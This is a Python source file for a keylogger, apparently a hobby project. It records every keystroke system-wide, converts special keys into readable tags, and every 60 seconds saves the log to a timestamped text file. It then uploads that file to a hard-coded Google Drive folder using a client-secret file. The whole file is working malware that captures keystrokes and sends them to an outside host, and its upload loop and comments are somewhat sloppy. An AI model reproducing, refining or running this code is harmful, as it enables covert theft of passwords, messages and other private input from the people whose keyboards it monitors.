from __future__ import print_function
import keyboard #For Logging Keystrokes
from threading import Timer #Ensures is to make a method run after an 'interval' amount of time
from datetime import datetime #Mark files with datetime timestamp
from Google import Create_Service
from googleapiclient.http import MediaFileUpload

#Google Create_Service Content
CLIENT_SECRET_FILE = 'client_file_keylogger_frost.json'
API_SERVICE_NAME = 'drive'
API_VERSION = 'v3'
SCOPES = ["https://www.googleapis.com/auth/drive","https://www.googleapis.com/auth/drive.file"]

#Google Drive Folder
folder_id = "1_sPBAhiEwzh45f2Vrea3NUJ7uGUhsUqm"
mime_types = ["text/plain"]
service = Create_Service(CLIENT_SECRET_FILE, API_SERVICE_NAME, API_VERSION, SCOPES)

#Duration To Send Report
SEND_REPORT_EVERY = 60

class keylogger:
    def __init__(self, interval, report_method="file"):
        self.interval = interval #Pass SEND_REPORT_EVERY to "interval" variable
        self.report_method = report_method #Utilizing GoogleDriveApi to upload file
        self.log = "" #Contains the log of all the keystrokes within 'self.interval'
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    #callback func invoked whenever a keyboard event occurs
    def callback(self, event):
        name = event.name

        if len(name) > 1:
            #Not a character, special key (E.g. Ctrl, Alt, Etc)
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name #Add key name to global 'self.log' variable
    
    #used to rename filenames to be identified by start & end datestimes
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    #creates a log file in the current directory that contains the current keylogs in the 'self.log' variable
    def report_to_file(self, mime_types, folder_id):
        
        with open(f'{self.filename}.txt', 'w') as f: #opens the file in write mode
                print(self.log, file=f) #writes the keylogs to file
        print(f"[+] Saved {self.filename}.txt")
        
        for file_name, mime_types in zip(f'{self.filename}.txt', mime_types):
            file_metadata = {
                'name' : f'{self.filename}.txt',
            'parents' : [folder_id]
            }

            media = MediaFileUpload(f'{self.filename}.txt', resumable=True)

            service.files().create(body=file_metadata, media_body=media, fields="id").execute()
            print(f"[+] Successfully Uploaded: {self.filename},txt")

    #invokes every 'self.interval'. Sends keylogs and reset 'self.log' variable
    def report(self):

        #If there is something in log, report it
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename() #Update filename
            self.report_to_file(mime_types, folder_id)
            #print(f"[{self.filename}] - {self.log}") #If you don't want to print in the console, comment this line
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True #Set thread to daemon (dies when main thread dies)
        timer.start() #Starts the timer

    def start(self):
        self.start_dt = datetime.now() #Record start datetime
        keyboard.on_release(callback=self.callback) #Start the keylogger
        self.report() #Start reporting key strokes
        print(f"{datetime.now()} - Started Keylogger") #Inidicator to indicate when keylogger has started
        keyboard.wait() #block the current thread, wait until Ctrl + C is pressed

if __name__ == "__main__":
    keylogger = keylogger(interval=SEND_REPORT_EVERY, report_method="email") #Keylogger to send to email
    keylogger.start()
